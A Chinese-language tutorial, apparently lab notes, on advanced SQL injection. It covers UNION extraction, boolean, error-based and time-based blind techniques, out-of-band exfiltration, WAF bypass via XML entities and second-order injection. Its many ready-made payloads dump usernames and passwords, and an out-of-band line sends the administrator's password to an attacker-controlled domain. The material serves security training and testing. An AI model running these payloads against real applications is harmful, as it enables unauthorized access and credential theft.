## 1. 先判断结果信道

漏洞的本质，是应用把用户输入直接拼进了 SQL 语句。

进阶注入首先要解决的不是"怎么构造引号"，而是：**查询结果会通过什么方式被观察到？**

- **回显型**：查询结果直接显示在页面上（原查询回显 / UNION 回显）
- **可见报错**：结果不显示，但报错文案本身携带数据
- **条件报错（布尔盲注的一种）**：只有报错/不报错的差异，一次 1 bit
- **布尔盲注**：页面只反映"条件真假"或"有没有查到行"
- **时间盲注**：页面只反映响应时间
- **外带注入**：结果通过 DNS、HTTP 等外部请求传出

先确定结果的传递方式，再选择对应的测试方法。信息效率从高到低：UNION 回显 > 报错带数据 > 布尔 > 时间

回显型注入主要有两种形式。

**原查询回显**：应用本来就会把查询结果渲染到页面上。只要把 `WHERE` 条件放宽，多出来的行就会照常显示出来。基础篇中的商品分类示例就是这种情况：不需要测列数，也不需要使用 `UNION`。

**联合查询回显**：使用 `UNION` 追加另一条 `SELECT`，把其他表中的数据放进原查询的结果中：

```sql
' UNION SELECT username, password FROM users--+
```

使用 `UNION` 时需要满足两个条件：

- 两条 `SELECT` 的结果列数相同。对齐的是查询输出的列数，不是表中所有字段的数量。例如 `SELECT name, price FROM products` 的结果就是 2 列，即使 `products` 表还有其他字段。
- 相同位置的字段类型必须兼容。数据库有时会进行隐式转换，但不要依赖这种行为。

## 2. 注入点位置

注入点不止 URL。任何"应用会把它拼进 SQL"的可控输入都是候选：

- URL 参数、POST 表单
- JSON 字段
- XML 字段
- Cookie
- 请求头（User-Agent、X-Forwarded-For 等）

注入点也不一定在 SELECT 的 WHERE 里：

- **INSERT**：值里的注入，可以在 VALUES 中追加额外字段或额外行
- **UPDATE**：SET 值或 WHERE 条件中的注入
- **ORDER BY**：通常不能直接 UNION（位置在语句末尾，可利用排序差异做布尔侧信道、条件表达式或时间侧信道）
- **堆叠查询**：一条请求执行多条语句。PostgreSQL、SQL Server 支持；MySQL 取决于驱动配置（PDO/mysqli 常默认关闭）；Oracle 不支持普通堆叠

排查方法：对每个输入点单独做测试，哪个输入的 `'` 引起响应变化大概是注入点

## 3. 注释与外壳

### 注释符规则

- **MySQL**：`--` 后必须跟空格或控制字符，URL 中写 `--+` 或 `--%20`；`#` 只有 MySQL 认，URL 中写 `%23`
- **PostgreSQL / Oracle / SQL Server**：`--` 通常直接注释到行尾

注意：`--+` 里的 `+` 是 URL 的空格编码。在 POST body、cookie、XML 里写注释时，用真实的 `-- `（带空格）或让 `--` 直接结尾即可

### 外壳与探针

把负责制造页面变化的固定部分称为**外壳**，把实际执行的数据库表达式称为**探针**。回显型和非回显型可以使用相同的探针，但外壳不同：

- 回显型：直接读取探针返回的字符串
- 非回显型：只判断探针能否执行，或判断它的结果是真还是假

## 4. 数据库指纹决策树

- `FROM dual` 成功不能单独判成 Oracle（MySQL/MariaDB 也有 dual）；`version()` 成功不能单独判成 PostgreSQL（MySQL 也有这个函数）。必须走互斥分支
- `IS NOT NULL` 外壳只能判断"表达式能否执行并返回非 NULL"，看不到版本字符串的内容
- 区分 MariaDB 与 MySQL 时，不要把 `LIKE` 再包进 `IS NOT NULL`（结果是 0 或 1，都非 NULL，恒真）。判据是永真 = MariaDB、永假 = MySQL，且前提是已确认 MySQL 家族——SQL Server 的 @@version 不含 Maria，单独跑会误判
- Oracle 的 `v$version` 通常返回多行，放入布尔外壳需要 `WHERE ROWNUM=1` 限制

## 5. UNION 注入六步

### 第一步：确定注入点

在字符串参数中多输入一个单引号，观察页面是否发生异常。

假设分类参数原值为 `Gifts`，输入 `Gifts'` 后，应用可能拼出：

```sql
SELECT * FROM products WHERE category = 'Gifts'' AND released = 1
```

这里连续出现的两个单引号，分别来自用户输入的单引号和应用在参数末尾补上的单引号。最终引号数量不匹配，字符串没有正确闭合，语句通常会执行失败。

注意，一次输入两个引号，例如 `Gifts''`，其中的 `''` 可能只是字符串内容中的一个撇号，左右引号仍然配对。页面正常并不能据此排除注入点。

失败也不一定表现为 HTTP 500。应用可能会把数据库错误转换成固定页面，此时状态码仍然是 200，但列表为空、正文发生变化，或者页面出现统一错误提示。这些同样可能是注入点的信号。

### 第二步：确定结果列数

只有准备使用 UNION 把其他表的数据带出来时，才需要确定原查询的结果列数。常用方法两种：递增测试 `ORDER BY`；递增测试 `UNION SELECT NULL`。

使用 ORDER BY，最后一个能正常返回页面的数字就是列数：

```sql
' ORDER BY 1--+    → 200
' ORDER BY 2--+    → 200
' ORDER BY 3--+    → 500
```

如果从 3 开始失败，说明前两个序号有效，原查询返回 2 列。

使用 UNION SELECT NULL，第一个能正常返回的 NULL 数量就是列数：

```sql
' UNION SELECT NULL--+       → 500
' UNION SELECT NULL,NULL--+  → 200
```

`NULL` 可以与多种数据类型兼容，因此适合先确定列数，再单独测试哪些列能够显示文本。

### 第三步：找出可回显的文本列

假设原查询返回 4 列，可以依次把一个位置替换成字符串 `'a'`，其余位置保持为 `NULL`：

```sql
' UNION SELECT 'a',NULL,NULL,NULL--+
' UNION SELECT NULL,'a',NULL,NULL--+
' UNION SELECT NULL,NULL,'a',NULL--+
' UNION SELECT NULL,NULL,NULL,'a'--+
```

如果某个请求既能正常执行，页面上又出现了 `a`，说明对应位置可以回显文本。

可显示文本的列可能不止一列。每次只改变一个位置、其余位置保持为 NULL，这样测试失败时才能确定问题出在哪一列。

### 第四步：枚举表和列

除 Oracle 和 SQLite 外，大多数数据库都可以使用 `information_schema` 查询元数据。下面假设原查询返回两列，第二列可以显示文本。

MySQL、SQL Server 和 PostgreSQL：

```sql
' UNION SELECT NULL,table_name FROM information_schema.tables--+
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='表名'--+
```

Oracle（未使用双引号创建的表名通常以大写形式保存）：

```sql
' UNION SELECT NULL,table_name FROM all_tables--+
' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name='USERS'--+
```

SQLite（没有 information_schema，查询 sqlite_master）：

```sql
' UNION SELECT NULL,name FROM sqlite_master WHERE type='table'--+
' UNION SELECT NULL,sql FROM sqlite_master WHERE name='表名'--+
```

第二行取的是建表语句原文，列名就在 `CREATE TABLE` 的字段定义里——这是 SQLite 取列名的顺手方式。

### 第五步：读取数据

确定以下信息后，就可以构造最终查询：原查询的结果列数；可以回显文本的列；目标表名；目标列名。

```sql
' UNION SELECT username, password FROM users--+
```

### 第六步：单列回显时的拼接与聚合

如果只有一列能够显示文本，可以把多个字段拼接成一个字符串：

```sql
-- Oracle 和 PostgreSQL
' UNION SELECT username || '~' || password FROM users--+

-- MySQL（默认 || 是逻辑或，用 CONCAT）
' UNION SELECT CONCAT(username,'~',password) FROM users--+

-- SQL Server
' UNION SELECT username + '~' + password FROM users--+
```

多行结果收成一行（页面只显示一行结果时），用聚合函数：

- MySQL：`GROUP_CONCAT(...)`
- PostgreSQL：`string_agg(..., ',')`
- SQL Server：`STRING_AGG(..., ',')`
- Oracle：`LISTAGG(...) WITHIN GROUP (ORDER BY ...)`

各数据库对 NULL 的处理方式不同：

- PostgreSQL 的 ||：任意一部分为 NULL，结果通常为 NULL
- MySQL 的 CONCAT：任意参数为 NULL，结果通常为 NULL
- SQL Server 的 +：可能因会话设置不同而产生不同结果
- Oracle 的 ||：会把 NULL 当作空字符串处理

更保险的写法是使用 COALESCE，但注意 Oracle 里空字符串就是 NULL，`COALESCE(password,'')` 兜不住，要用非空字面量：

```
COALESCE(password,'N')
```

分隔符应选择数据中很少出现的字符，避免后续切分时发生错位。

## 6. 布尔盲注

有些功能只关心查询"有没有返回行"，不会把列值写进 HTML。此时注入仍然修改的是同一条 SQL，但浏览器上看不到具体数据，只能通过副作用观察结果：页面上的一句话是否出现；页面内容或顺序是否变化。

### 三发基线

必须先能区分三种页面，任何一发结果都要能归入其中之一：

- **真页面**：条件为真，目标行仍然存在
- **假页面**：条件为假，没有返回目标行
- **错误页面**：SQL 执行失败，例如状态码 500 或统一错误提示——不要和正常执行后的假页面混为一谈

字符串型基准：

```
原值' AND '1'='1
原值' AND '1'='2
```

数字型基准（去掉外层引号，两条独立语句）：

```
原值 AND 1=1
原值 AND 1=2
```

两条请求的状态码可能都是 200，区别通常在页面内容，例如是否出现 `Welcome back`。

### 逐位读取字符

读取某个字符时：第一个数字表示位置，从 1 开始；第二个数字表示截取长度，固定为 1；最后的数字是待比较的字符编码。例如判断 administrator 密码第一个字符的 ASCII 编码是否为 97：

```sql
原值' AND ASCII(
  SUBSTRING(
    (SELECT password
     FROM users
     WHERE username='administrator'),
    1,
    1
  )
)=97 AND '1'='1
```

函数适用范围：

- SUBSTRING：MySQL、PostgreSQL、SQL Server；Oracle 用 SUBSTR
- 长度函数：MySQL、PostgreSQL、Oracle 用 LENGTH；SQL Server 用 LEN

先判断密码长度，再逐位确定字符。**二分搜索**能大幅减少请求数：用范围比较（> 中值）每次砍掉一半，95 个候选字符约 7 问就能定位一位；等值比较适合并行批量（只有猜中的那一发产生差异）。20 位密码约需 140 发。

## 7. 条件报错（用报错当 1 bit）

应用返回自定义错误页时，报错/不报错可以当布尔位使用：

- **500 = 条件为真**并触发错误
- **200 = 条件为假**，没有触发错误

这是 Oracle 专属写法（MySQL 没有 to_char，同样的句子永远报错，真假直接失灵；SUBSTR 也是 Oracle 形态）：

```sql
' AND (SELECT CASE WHEN LENGTH(password)>3
                   THEN to_char(1/0)
                   ELSE 'a' END
       FROM users
       WHERE username='administrator')='a
```

CASE 两个分支的类型必须一致：`to_char(1/0)` 与 `'a'` 都是字符串。CASE 为真时除零报错、页面 500；为假时比较 'a'='a'、页面 200。逐位提取时把条件换成 ASCII(SUBSTR(...))>N。

## 8. 可见报错（报错带数据）

查询结果不回显，但数据库报错信息详细可见时，把想查的数据塞进一个**必然失败的类型转换**，让报错文案把数据念出来。一次请求带走一整串数据。

前提：不是每家库的转换报错都携带原值，没有跨数据库的通用 payload：

- PostgreSQL：`invalid input syntax for type integer: "值"`——用 `::int` 或 CAST，能把值带出来
- SQL Server：`Conversion failed ... value '值'`——CAST 同样可用
- MySQL：转换静默返回 0，要用 `extractvalue(1,concat(0x7e,(SELECT ...)))` 或 updatexml 这类 XML 函数
- Oracle：ORA-01722 报错不含值，要走 XML 类函数
- SQLite：静默转 0，无通用手法

流程：① 所有输入点打 `'` 找注入点 → ② 评估报错质量（文案含 SQL 原文 = 可见报错；只有 500 = 不能把数据嵌进报错，但条件报错的 1 bit 仍然可用）→ ③ 指纹 → ④ 构造 CAST → ⑤ 先用已知值校准（如 current_database()）→ ⑥ 逐发提取。

有时需注意是否有长度截断，cookie 长度可能会有要求。

### 实操：PostgreSQL + cookie 前 60 字符截断

步骤一：先看第一行是谁：

```sql
x'||(SELECT username::int FROM users LIMIT 1)||'
```

![图17](/img/sql-adv-17.png)

步骤二：取密码。**无长度限制时的通用写法**（WHERE 已保证单行，不需要 LIMIT）：

```sql
x'||(SELECT password::int
      FROM users
      WHERE username='administrator')||'
```

**本题 60 字符截断内的实战写法**（上面的通用版约 79 字符，会被截断成残废 payload）：LIMIT 1 抓第一行，不是 administrator 就用 OFFSET 翻行：

```sql
x'||(SELECT password::int FROM users LIMIT 1)||'        ← 48 字符
x'||(SELECT password::int FROM users LIMIT 1 OFFSET 1)||'  ← 58 字符，翻下一行
```

## 9. 时间盲注

部分网页会直接 catch 异常，以 200 正常返回，状态码失去真假区分度；但可以让数据库主动执行延时函数，由于查询是同步执行的，SQL 层的延时会原样传导到 HTTP 响应时间上，**响应快慢**成为新的真假指示灯。慢 = 真，快 = 假。

### 基线与阈值

- 先连续发送普通请求，记录正常响应时间（如基线约 1.2 秒）
- 再发一发明显延时，确认延时会传导到响应
- 判定线与基线拉开一个数量级（基线 1 秒级时，延时设 5~10 秒才可信）；网络抖动零点几秒是正常噪音

### 各库延时写法

```sql
-- MySQL（函数，可进表达式）
IF(condition, SLEEP(5), 0)

-- PostgreSQL（两分支都返回 void，类型配平；ELSE NULL 是类型坑）
CASE WHEN condition THEN pg_sleep(5) ELSE pg_sleep(0) END

-- SQL Server（语句级，需要堆叠查询）
'; IF condition WAITFOR DELAY '00:00:05'--

-- Oracle（无原生 sleep，管道函数凑，可能受权限限制）
CASE WHEN condition
     THEN dbms_pipe.receive_message('x',5)
     ELSE 0 END
```

延时语法本身就是指纹探针：哪家语法睡了就是哪家。错库语法会被吞成"快响应"，与"条件为假"外观相同——所以必须先**无条件校准**（裸延时一发），再挂条件。

## 10. 外带注入（OOB / OAST）

当页面不回显、布尔不可区分、时间也被过滤时，让数据库自己发起 DNS 或 HTTP 请求到你控制的系统。判断注入成功与否不在 HTTP 响应里看，而在外部面板看有没有收到交互。

两种：

```sql
条件触发（一次 1 bit）：CASE WHEN condition THEN UTL_HTTP.REQUEST('http://你的域') END
```

- 
- **数据直传**（一次一整段）：把数据拼进子域——`UTL_HTTP.REQUEST('http://'||(SELECT password FROM users WHERE username='administrator')||'.你的域/')`，收到的解析记录里，子域那段就是数据

各库触发方式：

- Oracle：`UTL_HTTP.REQUEST()` / `UTL_INADDR.GET_HOST_ADDRESS()`
- SQL Server：`xp_dirtree '\\你的域\a'`（UNC 路径触发主机名解析）
- MySQL：`LOAD_FILE('\\你的域\test')`（仅 Windows，常被禁）
- PostgreSQL：无好用的内建（COPY TO PROGRAM 需要超户）

依赖条件：数据库的出站网络权限 + 你控制的公网服务。

## 11. 过滤、WAF 与 XML 实体

WAF 按原始字节匹配签名；解析器（XML / URL / JSON）在服务端解码后才交给 SQL。**防御检查的是线上格式，攻击落地的是解码后格式**，两层之间的错位就是绕过空间。

编码手段按上下文选择：

- XML 实体：`&#x53;` = S——只在 XML 解析链里生效；JSON 不认它，等价物是 `\u0053`；URL 编码是 `%53`
- 注释拆词：`SE/**/LECT`（防"关键字删减型"过滤时慎用，删掉后拼不回来）
- 大小写混合、双重 URL 编码（服务端解两层时）

XML（extensible Markup Language，可扩展标记语言）是一种用标签组织数据的文本格式：

```
<stockCheck>
    <productId>123</productId>
    <storeId>999</storeId>
</stockCheck>
```

文章示例（注意：只演示编码，解码后是 `999 SELECT ...`，本身并不是一条能执行的语句，因为没有 UNION 提供左操作数）：

```sql
<stockCheck>
    <productId>123</productId>
    <storeId>999 SELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

### 实操：XML + 签名 WAF

找到了注入点（storeId），签名黑名单拦截 '、UNION、SELECT。生效的写法（保留前导数字作为 UNION 的左操作数）：

```sql
<storeId>1 UNION SELECT username||password FROM users</storeId>
```

## 12. 二次注入

第一次入库时是合法字符串（参数化写入原样保存），第二次被拼进 SQL 才生效。注册用户名 `admin'--`：入库时 ' 只是数据；日后改密码时应用从库里读出用户名拼接：

```sql
UPDATE users SET password='新密码'
WHERE username='admin'--' AND password='旧密码'
```

字符串闭合成 'admin'，-- 注释掉密码校验，改掉的是真正 admin 的密码
